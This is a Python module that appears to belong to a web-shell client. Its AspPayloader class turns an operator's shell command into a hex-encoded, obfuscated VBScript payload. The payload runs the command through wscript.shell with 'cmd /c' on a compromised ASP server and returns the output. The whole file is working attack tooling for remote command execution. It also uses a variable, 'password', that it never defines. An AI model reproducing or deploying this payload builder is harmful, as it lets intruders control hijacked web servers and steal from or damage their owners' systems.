#!/usr/bin/env python
# encoding: utf-8

import sys
sys.path.append('..')
from lib.core.payloader import Payloader

class AspPayloader(Payloader):

    def parseCmd(self, osType, pwd, cmd, payload):
        if osType == 'windows':
            currentDirCmd = 'cd'
            divSymble = '&'
        else:
            currentDirCmd = 'pwd'
            divSymble = ';'
        cmd = 'cd ' + pwd + divSymble + cmd + divSymble + 'echo [S]' + divSymble + currentDirCmd + divSymble + 'echo [E]'
        payload['z2'] = cmd.encode('hex')
        payload['z1'] = '636D64'
        payload[password] = 'Execute("Execute(""On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Execute(""""On Error Resume Next:""""&bd(""""53657420583D4372656174654F626A6563742822777363726970742E7368656C6C22292E657865632822222222266264285265717565737428227A3122292926222222202F6320222222266264285265717565737428227A322229292622222222293A496620457272205468656E3A533D225B4572725D2022264572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A4F3D582E5374644F75742E52656164416C6C28293A453D582E5374644572722E52656164416C6C28293A533D4F26453A456E642049663A526573706F6E73652E7772697465285329"""")):Response.End"")")'
